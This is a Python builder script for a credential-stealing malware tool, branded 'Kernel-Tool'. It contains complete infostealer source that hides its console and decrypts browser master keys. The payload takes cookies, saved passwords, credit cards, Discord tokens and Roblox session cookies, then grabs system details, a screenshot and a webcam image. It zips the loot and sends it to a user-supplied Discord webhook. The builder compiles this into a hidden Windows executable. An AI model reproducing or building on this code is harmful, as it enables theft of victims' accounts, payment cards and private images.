# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ------------------------------------------------------------------------------------------------
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner,
#       but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
#       propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
# ------------------------------------------------------------------------------------------------

import os
import sys
import subprocess
import shutil
import site
import glob as _glob
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from Config.Config import stealer_banner

LC = "\033[38;2;0;200;255m"
RS = "\033[0m"

def W(text):
    print(text, end='', flush=True)

def get_pywin32_binaries():
    args = []
    try:
        sp = site.getsitepackages()[0]
        for d, dest in [(os.path.join(sp, 'win32'), 'win32'), (os.path.join(sp, 'pywin32_system32'), '.')]:
            for pat in ['*.pyd', '*.dll']:
                for f in _glob.glob(os.path.join(d, pat)):
                    args += ['--add-binary', f'{f};{dest}']
    except:
        pass
    return args

PAYLOAD_CODE = '''import os
import sys
import sqlite3
import json
import base64
import shutil
from datetime import datetime
import glob
import re
import requests
import ctypes
import zipfile
import time
import platform
import subprocess
import socket
import psutil
import random

if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

try:
    import win32crypt
    DPAPI_OK = True
except:
    DPAPI_OK = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_OK = True
except:
    CRYPTO_OK = False

try:
    from PIL import ImageGrab
    SCREENSHOT_OK = True
except:
    SCREENSHOT_OK = False

try:
    import cv2
    WEBCAM_OK = True
except:
    WEBCAM_OK = False

class Stealer:
    def __init__(self):
        self.browsers = {
            'Chrome':   {'path': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Google', 'Chrome', 'User Data'),              'profiles': ['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5']},
            'Edge':     {'path': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Microsoft', 'Edge', 'User Data'),             'profiles': ['Default','Profile 1','Profile 2','Profile 3']},
            'Brave':    {'path': os.path.join(os.environ.get('LOCALAPPDATA',''), 'BraveSoftware', 'Brave-Browser', 'User Data'),'profiles': ['Default','Profile 1','Profile 2']},
            'Opera':    {'path': os.path.join(os.environ.get('APPDATA',''), 'Opera Software', 'Opera Stable'),                  'profiles': ['']},
            'OperaGX':  {'path': os.path.join(os.environ.get('APPDATA',''), 'Opera Software', 'Opera GX Stable'),              'profiles': ['']},
            'Vivaldi':  {'path': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Vivaldi', 'User Data'),                      'profiles': ['Default','Profile 1']},
            'Yandex':   {'path': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Yandex', 'YandexBrowser', 'User Data'),      'profiles': ['Default','Profile 1']},
            'Firefox':  {'path': os.path.join(os.environ.get('APPDATA',''), 'Mozilla', 'Firefox', 'Profiles'),                 'profiles': []},
        }
        self.data  = {'cookies':[],'passwords':[],'cards':[],'tokens':[],'roblox':[]}
        self.stats = {'browsers_found':0,'total_cookies':0,'total_passwords':0,'total_cards':0,'total_tokens':0,'total_roblox':0}
        self.pc    = {}
        self.sid   = str(abs(hash(datetime.now().timestamp())))[:8]
        self.tmp   = os.path.join(os.environ.get('TEMP',''), f'_s{self.sid}')
        os.makedirs(self.tmp, exist_ok=True)

    def master_key(self, browser_path):
        try:
            p = os.path.join(browser_path, 'Local State')
            if not os.path.exists(p): return None
            with open(p, 'r', encoding='utf-8') as f: j = json.load(f)
            return win32crypt.CryptUnprotectData(base64.b64decode(j['os_crypt']['encrypted_key'])[5:],None,None,None,0)[1]
        except: return None

    def decrypt(self, enc, key):
        try:
            if enc[:3] in (b'v10', b'v11'):
                return AESGCM(key).decrypt(enc[3:15], enc[15:-16]+enc[-16:], None).decode('utf-8', errors='ignore')
            return win32crypt.CryptUnprotectData(enc,None,None,None,0)[1].decode('utf-8', errors='ignore')
        except: return ""

    def grab_cookies(self, bname, pp):
        cp = os.path.join(pp, 'Network', 'Cookies')
        if not os.path.exists(cp): cp = os.path.join(pp, 'Cookies')
        if not os.path.exists(cp): return
        tmp = os.path.join(self.tmp, f'c_{bname}_{self.sid}.db')
        try:
            shutil.copy2(cp, tmp)
            mk = self.master_key(os.path.dirname(pp))
            for host, name, val, enc in sqlite3.connect(tmp).execute("SELECT host_key,name,value,encrypted_value FROM cookies"):
                self.data['cookies'].append({'browser':bname,'host':host,'name':name,'value':self.decrypt(enc,mk) if enc and mk else val})
                self.stats['total_cookies'] += 1
            os.remove(tmp)
        except: pass

    def grab_passwords(self, bname, pp):
        lp = os.path.join(pp, 'Login Data')
        if not os.path.exists(lp): return
        tmp = os.path.join(self.tmp, f'l_{bname}_{self.sid}.db')
        try:
            shutil.copy2(lp, tmp)
            mk = self.master_key(os.path.dirname(pp))
            for url, user, enc_pw in sqlite3.connect(tmp).execute("SELECT origin_url,username_value,password_value FROM logins"):
                pw = self.decrypt(enc_pw, mk) if enc_pw and mk else ""
                if user or pw:
                    self.data['passwords'].append({'browser':bname,'url':url,'username':user,'password':pw})
                    self.stats['total_passwords'] += 1
            os.remove(tmp)
        except: pass

    def grab_cards(self, bname, pp):
        wp = os.path.join(pp, 'Web Data')
        if not os.path.exists(wp): return
        tmp = os.path.join(self.tmp, f'w_{bname}_{self.sid}.db')
        try:
            shutil.copy2(wp, tmp)
            mk = self.master_key(os.path.dirname(pp))
            try: rows = sqlite3.connect(tmp).execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards").fetchall()
            except: rows = []
            for name, month, year, enc_num in rows:
                num = self.decrypt(enc_num, mk) if enc_num and mk else ""
                if name or num:
                    self.data['cards'].append({'browser':bname,'name':name,'number':num,'exp':f"{month}/{year}"})
                    self.stats['total_cards'] += 1
            os.remove(tmp)
        except: pass

    def grab_tokens(self, bname, pp):
        ldb = os.path.join(pp, 'Local Storage', 'leveldb')
        if not os.path.exists(ldb): return
        pats = [r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}']
        for fp in glob.glob(os.path.join(ldb, '*.ldb')):
            try:
                content = open(fp, 'r', encoding='utf-8', errors='ignore').read()
                for pat in pats:
                    for tok in re.findall(pat, content):
                        if tok not in [x['token'] for x in self.data['tokens']]:
                            self.data['tokens'].append({'browser':bname,'token':tok})
                            self.stats['total_tokens'] += 1
            except: pass

    def grab_roblox(self):
        for bname, binfo in self.browsers.items():
            if bname == 'Firefox': continue
            if not os.path.exists(binfo['path']): continue
            for pname in binfo['profiles']:
                pp = os.path.join(binfo['path'], pname) if pname else binfo['path']
                if not os.path.exists(pp): continue
                cp = os.path.join(pp, 'Network', 'Cookies')
                if not os.path.exists(cp): cp = os.path.join(pp, 'Cookies')
                if not os.path.exists(cp): continue
                tmp = os.path.join(self.tmp, f'r_{bname}_{self.sid}.db')
                try:
                    shutil.copy2(cp, tmp)
                    mk = self.master_key(os.path.dirname(pp))
                    for name, val, enc in sqlite3.connect(tmp).execute("SELECT name,value,encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com%'"):
                        dec = self.decrypt(enc, mk) if enc and mk else val
                        if name == '.ROBLOSECURITY' and dec:
                            self.data['roblox'].append({'browser':bname,'cookie':dec})
                            self.stats['total_roblox'] += 1
                    os.remove(tmp)
                except: pass

    def get_pc_info(self):
        try:
            self.pc = {
                'name':     os.environ.get('COMPUTERNAME','Unknown'),
                'user':     os.environ.get('USERNAME','Unknown'),
                'hostname': socket.gethostname(),
                'os':       platform.version(),
                'cpu':      platform.processor(),
                'ram':      f"{round(psutil.virtual_memory().total/(1024**3),2)} GB",
                'hwid':     subprocess.check_output('wmic csproduct get uuid',shell=True).decode().split('\\n')[1].strip() if sys.platform=='win32' else 'N/A',
                'uptime':   f"{(time.time()-psutil.boot_time())/3600:.1f}h"
            }
        except: pass

    def screenshot(self):
        try:
            if SCREENSHOT_OK:
                p = os.path.join(self.tmp, 'screenshot.png')
                ImageGrab.grab().save(p)
                return p
        except: pass
        return None

    def webcam(self):
        try:
            if WEBCAM_OK:
                cam = cv2.VideoCapture(0)
                time.sleep(1)
                ret, frame = cam.read()
                cam.release()
                if ret:
                    p = os.path.join(self.tmp, 'webcam.png')
                    cv2.imwrite(p, frame)
                    return p
        except: pass
        return None

    def grab_all(self):
        for bname, binfo in self.browsers.items():
            if not os.path.exists(binfo['path']): continue
            self.stats['browsers_found'] += 1
            if bname == 'Firefox': continue
            for pname in binfo['profiles']:
                pp = os.path.join(binfo['path'], pname) if pname else binfo['path']
                if not os.path.exists(pp): continue
                self.grab_cookies(bname, pp)
                self.grab_passwords(bname, pp)
                self.grab_cards(bname, pp)
                self.grab_tokens(bname, pp)

    def build_zip(self):
        zp = os.path.join(self.tmp, f'{self.sid}.zip')
        try:
            sep = '-'*50
            txt = {
                'pc_info.txt':      f"Name: {self.pc.get('name')}\\nUser: {self.pc.get('user')}\\nHostname: {self.pc.get('hostname')}\\nOS: {self.pc.get('os')}\\nCPU: {self.pc.get('cpu')}\\nRAM: {self.pc.get('ram')}\\nHWID: {self.pc.get('hwid')}\\nUptime: {self.pc.get('uptime')}\\nDate: {datetime.now()}",
                'passwords.txt':    ('\\n'+sep+'\\n\\n').join(f"Browser : {x['browser']}\\nURL     : {x['url']}\\nUser    : {x['username']}\\nPass    : {x['password']}" for x in self.data['passwords']),
                'credit_cards.txt': ('\\n'+sep+'\\n\\n').join(f"Browser : {x['browser']}\\nName    : {x['name']}\\nNumber  : {x['number']}\\nExp     : {x['exp']}" for x in self.data['cards']),
                'discord.txt':      ('\\n'+sep+'\\n\\n').join(f"Browser : {x['browser']}\\nToken   : {x['token']}" for x in self.data['tokens']),
                'roblox.txt':       ('\\n'+sep+'\\n\\n').join(f"Browser : {x['browser']}\\nCookie  : {x['cookie']}" for x in self.data['roblox']),
                'cookies.txt':      '\\n'.join(f"{x['browser']}|{x['host']}|{x['name']}|{x['value'][:60]}" for x in self.data['cookies'][:300]),
                'summary.txt':      f"Browsers : {self.stats['browsers_found']}\\nCookies  : {self.stats['total_cookies']}\\nPasswords: {self.stats['total_passwords']}\\nCards    : {self.stats['total_cards']}\\nTokens   : {self.stats['total_tokens']}\\nRoblox   : {self.stats['total_roblox']}"
            }
            with zipfile.ZipFile(zp, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
                for fname, content in txt.items():
                    z.writestr(fname, content)
                for getter, name in [(self.screenshot,'screenshot.png'),(self.webcam,'webcam.png')]:
                    p = getter()
                    if p and os.path.exists(p): z.write(p, name)
            return zp
        except: return None

    def send(self, zp):
        try:
            wh = "YOUR_WEBHOOK_URL_HERE"
            time.sleep(random.uniform(5.0, 15.0))
            with open(zp,'rb') as f: data = f.read()
            if len(data)/(1024*1024) > 24: return
            embed = {"embeds":[{"description":f"**{self.pc.get('name')}** | {self.pc.get('user')}\\n\\nCookies: {self.stats['total_cookies']} | Passwords: {self.stats['total_passwords']} | Cards: {self.stats['total_cards']} | Tokens: {self.stats['total_tokens']}","color":3066993,"footer":{"text":f"Session {self.sid} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}}]}
            ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101']
            headers = {'User-Agent': random.choice(ua)}
            for _ in range(3):
                try:
                    r = requests.post(wh, files={'file':(f'{self.sid}.zip',data,'application/zip')}, data={'payload_json':json.dumps(embed)}, headers=headers, timeout=30)
                    if r.status_code in (200,204): break
                    if r.status_code == 429:
                        try: time.sleep(r.json().get('retry_after',5)+2)
                        except: time.sleep(7)
                    else: time.sleep(random.uniform(3,6))
                except: time.sleep(random.uniform(3,6))
        except: pass

    def run(self):
        try:
            self.get_pc_info()
            self.grab_all()
            self.grab_roblox()
            zp = self.build_zip()
            if zp: self.send(zp)
            shutil.rmtree(self.tmp, ignore_errors=True)
        except: pass

if __name__ == "__main__":
    try: Stealer().run()
    except: pass
'''

def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(stealer_banner)
    print()
    W(f"{LC}Webhook : {RS}")
    w = input().strip()

    if not w.startswith('https://discord.com/api/webhooks/'):
        print(f"{LC}Invalid webhook!{RS}")
        sys.exit()

    W(f"{LC}Output file name : {RS}")
    n = input().strip() or 'stealer'

    c = PAYLOAD_CODE.replace('YOUR_WEBHOOK_URL_HERE', w)

    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'

    print()
    print(f"{LC}Building payload...{RS}")

    with open(t, 'w', encoding='utf-8') as f:
        f.write(c)

    print(f"{LC}Compiling...{RS}")

    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        print(f"{LC}PyInstaller not found! Run: pip install pyinstaller{RS}")
        sys.exit()

    r = subprocess.run([
        'pyinstaller',
        '--onefile', '--windowed',
        '--hidden-import', 'win32crypt',
        '--hidden-import', 'win32api',
        '--hidden-import', 'win32con',
        '--hidden-import', 'win32security',
        '--hidden-import', 'pywintypes',
        '--hidden-import', 'winerror',
        '--hidden-import', 'sqlite3',
        '--hidden-import', 'cryptography',
        '--hidden-import', 'cryptography.hazmat.primitives.ciphers.aead',
        '--hidden-import', 'cryptography.hazmat.backends',
        '--hidden-import', 'cryptography.hazmat.backends.openssl',
        '--hidden-import', 'psutil',
        '--hidden-import', 'PIL',
        '--hidden-import', 'PIL.ImageGrab',
        '--hidden-import', 'cv2',
        '--collect-all', 'cryptography',
        '--collect-all', 'PIL',
        '--collect-all', 'cv2',
        '--collect-all', 'psutil',
        *get_pywin32_binaries(),
        '--noconfirm', '--clean',
        t
    ], capture_output=True, text=True)

    if r.returncode != 0:
        print(f"{LC}Compilation error!{RS}")
        print(r.stderr[:500])
        sys.exit()

    shutil.move(f'dist/{n}_temp.exe', e)

    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass

    print()
    print(f"{LC}══════════════════════════════════════════════════════════════════════{RS}")
    print(f"{LC}                         BUILD SUCCESSFUL!{RS}")
    print(f"{LC}══════════════════════════════════════════════════════════════════════{RS}")
    print(f"{LC}Output : output/{n}.exe{RS}")
    print(f"{LC}Webhook : {w[:50]}...{RS}")
    print()

if __name__ == "__main__":
    main()
